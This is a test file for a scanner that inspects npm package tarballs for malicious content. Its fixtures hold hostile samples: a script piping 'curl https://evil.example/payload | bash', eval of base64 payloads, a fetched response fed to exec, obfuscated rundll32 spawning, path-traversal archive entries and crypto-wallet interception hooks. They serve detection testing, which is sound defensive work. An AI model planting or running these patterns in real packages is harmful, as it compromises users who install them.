import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { describe, it } from 'node:test';
import { gunzipSync, gzipSync } from 'node:zlib';

import { analyzePackageTarball } from '../src/scanner/package-content.js';
import { Severity } from '../src/scanner/types.js';
import { StaticAnalyzer } from '../src/scanner/static-rules.js';
import { makeTarball } from './helpers/package-tarball.js';

function integrity(archive: Buffer): string {
  return `sha512-${createHash('sha512').update(archive).digest('base64')}`;
}

describe('package-content deep scanner', () => {
  it('verifies and scans a clean tarball entirely in memory', () => {
    const archive = makeTarball([
      { path: 'package/index.js', content: 'export const answer = 42;\n' },
      { path: 'package/logo.png', content: Buffer.from([1, 2, 3]) },
    ]);
    const result = analyzePackageTarball(archive, { integrity: integrity(archive) });

    assert.strictEqual(result.summary.status, 'complete');
    assert.strictEqual(result.summary.integrityVerified, true);
    assert.strictEqual(result.summary.filesScanned, 1);
    assert.strictEqual(result.summary.filesSkipped, 1);
    assert.deepStrictEqual(result.findings, []);
  });

  it('reports remote content piped to a shell as critical', () => {
    const archive = makeTarball([{
      path: 'package/scripts/install.sh',
      content: '#!/bin/sh\ncurl https://evil.example/payload | bash\n',
    }]);
    const result = analyzePackageTarball(archive);
    const finding = result.findings.find((entry) => entry.ruleId === 'content-remote-shell');

    assert.ok(finding);
    assert.strictEqual(finding.severity, Severity.Critical);
    assert.strictEqual(finding.filePath, 'package/scripts/install.sh');
    assert.strictEqual(finding.lineNumber, 2);
  });

  it('detects encoded payloads combined with dynamic execution', () => {
    const payload = 'A'.repeat(200);
    const archive = makeTarball([{
      path: 'package/index.js',
      content: `const payload = "${payload}";\neval(Buffer.from(payload, "base64").toString());\n`,
    }]);
    const result = analyzePackageTarball(archive);

    assert.ok(result.findings.some((entry) =>
      entry.ruleId === 'content-obfuscated-exec' && entry.severity === Severity.High));
  });

  it('detects a local network response flowing into a process command', () => {
    const archive = makeTarball([{
      path: 'package/install.js',
      content: 'const { exec } = require("child_process");\nconst response = await fetch("https://example.test/tool");\nconst command = await response.text(); exec(command);\n',
    }]);
    const result = analyzePackageTarball(archive);

    assert.ok(result.findings.some((entry) => entry.ruleId === 'content-network-exec'));
  });

  it('refuses an archive whose bytes do not match published integrity', () => {
    const archive = makeTarball([{ path: 'package/index.js', content: 'ok' }]);
    const result = analyzePackageTarball(archive, { integrity: 'sha512-AAAAAAAA' });

    assert.strictEqual(result.summary.status, 'failed');
    assert.ok(result.findings.some((entry) =>
      entry.ruleId === 'content-integrity-mismatch' && entry.severity === Severity.Critical));
  });

  it('accepts any matching digest from the strongest SRI algorithm', () => {
    const archive = makeTarball([{ path: 'package/index.js', content: 'ok' }]);
    const valid = createHash('sha512').update(archive).digest('base64');
    const result = analyzePackageTarball(archive, {
      integrity: `sha512-AAAAAAAA sha512-${valid}`,
    });

    assert.strictEqual(result.summary.integrityVerified, true);
    assert.strictEqual(result.summary.status, 'complete');
  });

  it('flags path traversal without writing archive entries to disk', () => {
    const archive = makeTarball([{ path: '../outside.js', content: 'console.log("x")' }]);
    const result = analyzePackageTarball(archive);

    assert.ok(result.findings.some((entry) => entry.ruleId === 'content-archive-path'));
  });

  it('flags an escaping PAX link target', () => {
    const archive = makeTarball([
      { path: 'pax-header', type: 'x', content: '24 linkpath=../../outside\n' },
      { path: 'package/link', type: '2', content: '' },
    ]);
    const result = analyzePackageTarball(archive);

    assert.ok(result.findings.some((entry) => entry.ruleId === 'content-archive-link'));
  });

  it('treats non-zero data after the tar terminator as an invalid archive', () => {
    const archive = makeTarball([{ path: 'package/index.js', content: 'ok' }]);
    const tar = gunzipSync(archive);
    tar[tar.length - 1] = 1;
    const result = analyzePackageTarball(gzipSync(tar));

    assert.strictEqual(result.summary.status, 'failed');
    assert.ok(result.findings.some((entry) => entry.ruleId === 'content-archive-invalid'));
  });

  it('does not mistake an ordinary RegExp exec call for child-process execution', () => {
    const archive = makeTarball([{
      path: 'package/index.js',
      content: 'const match = /hello/.exec(input);\n',
    }]);
    const result = analyzePackageTarball(archive);

    assert.ok(!result.findings.some((entry) => entry.ruleId === 'content-process-exec'));
  });

  it('marks the scan partial when configured text limits are reached', () => {
    const archive = makeTarball([{
      path: 'package/large.js',
      content: 'x'.repeat(256),
    }]);
    const result = analyzePackageTarball(archive, { maxFileBytes: 64 });

    assert.strictEqual(result.summary.status, 'partial');
    assert.strictEqual(result.summary.truncated, true);
    assert.ok(result.findings.some((entry) => entry.ruleId === 'content-scan-incomplete'));
  });

  it('reports native executable content once per archive', () => {
    const archive = makeTarball([
      { path: 'package/prebuilds/a.node', content: Buffer.from([0, 1, 2]) },
      { path: 'package/prebuilds/b.node', content: Buffer.from([0, 1, 2]) },
    ]);
    const result = analyzePackageTarball(archive);

    assert.strictEqual(result.findings.filter((entry) => entry.ruleId === 'content-native-binary').length, 1);
  });

  it('integrates concealed native execution with metadata scoring and archive deduplication', () => {
    const source = "require('child_'+'process')['sp'+'awn']('rund'+'ll32', ['native.dll,Entry']);";
    const result = analyzePackageTarball(makeTarball([
      { path: 'package/install.js', content: source },
      { path: 'package/duplicate.js', content: source },
      { path: 'package/native.dll', content: Buffer.from([0, 1]) },
    ]));
    const report = new StaticAnalyzer().analyze('', {
      name: 'native-regression', version: '1.0.0', scripts: { install: 'node install.js' },
    }, result.findings, result.summary);
    assert.equal(result.summary.status, 'complete');
    assert.equal(result.findings.filter(f => f.ruleId === 'content-concealed-native-exec').length, 1);
    assert.equal(report.score, 74);
    assert.equal(report.overallLevel, 'suspicious');
  });

  it('integrates browser interception evidence without relying on an install hook', () => {
    const source = String.raw`
      const eth = /0x[a-fA-F0-9]{40}/g;
      const btc = /bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71}/g;
      fetch = async function(input) { return new Response(await previous(input)); };
      XMLHttpRequest.prototype.send = function(body) { return savedSend.call(this, body); };
    `;
    const result = analyzePackageTarball(makeTarball([{ path: 'package/browser.js', content: source }]));
    const report = new StaticAnalyzer().analyze('', { name: 'browser-regression', version: '1.0.0' }, result.findings, result.summary);
    assert.ok(result.findings.some(f => f.ruleId === 'content-browser-interception'));
    assert.equal(report.score, 75);
    assert.equal(report.overallLevel, 'dangerous');
  });

  it('does not classify an ordinary function beside an encoded asset as dynamic execution', () => {
    const source = `const asset = '${'A'.repeat(200)}'; function ordinary() { return asset; }`;
    const result = analyzePackageTarball(makeTarball([{ path: 'package/asset.js', content: source }]));
    assert.ok(!result.findings.some(f => f.ruleId === 'content-obfuscated-exec'));
  });

  it('does not combine dynamic-execution examples in comments or strings with encoded assets', () => {
    for (const example of ['// new Function() => function(){}', 'const docs = "eval(payload)";']) {
      const source = `const asset = '${'A'.repeat(200)}';\n${example}`;
      const result = analyzePackageTarball(makeTarball([{ path: 'package/examples.js', content: source }]));
      assert.ok(!result.findings.some(f => f.ruleId === 'content-obfuscated-exec'));
    }
  });

  it('reports a lexical inspection budget as partial rather than silently complete', () => {
    const source = `const encoded = '${'A'.repeat(200)}'; Function(encoded);` + '0;'.repeat(150_000);
    const result = analyzePackageTarball(makeTarball([{ path: 'package/dense.js', content: source }]));
    assert.equal(result.summary.status, 'partial');
    assert.match(result.summary.reason!, /token inspection/);
    assert.ok(result.findings.some(f => f.ruleId === 'content-scan-incomplete'));
  });

  it('keeps unrelated networking and process use as a capability rather than a high execution link', () => {
    const source = `const cp=require('child_process'); fetch('/telemetry'); cp.exec('tool --version');`;
    const result = analyzePackageTarball(makeTarball([{ path: 'package/install.js', content: source }]));
    assert.ok(!result.findings.some(f => f.ruleId === 'content-network-exec'));
    assert.ok(result.findings.some(f => f.ruleId === 'content-process-exec' && f.severity === Severity.Medium));
  });

  it('does not skip fully escaped native-loader evidence in the lexical prefilter', () => {
    const encoded = (value: string) => [...value].map(char => `\\x${char.charCodeAt(0).toString(16)}`).join('');
    const source = `require('${encoded('child_process')}')['${encoded('spawn')}']('${encoded('rundll32')}', ['native.dll,Entry']);`;
    const result = analyzePackageTarball(makeTarball([{ path: 'package/install.js', content: source }]));
    assert.ok(result.findings.some(f => f.ruleId === 'content-concealed-native-exec'));
  });

  it('does not spend the lexical budget when no lexical detector has a candidate', () => {
    const result = analyzePackageTarball(makeTarball([{ path: 'package/data.js', content: '0;'.repeat(150_000) }]));
    assert.equal(result.summary.status, 'complete');
    assert.equal(result.summary.truncated, false);
  });
});
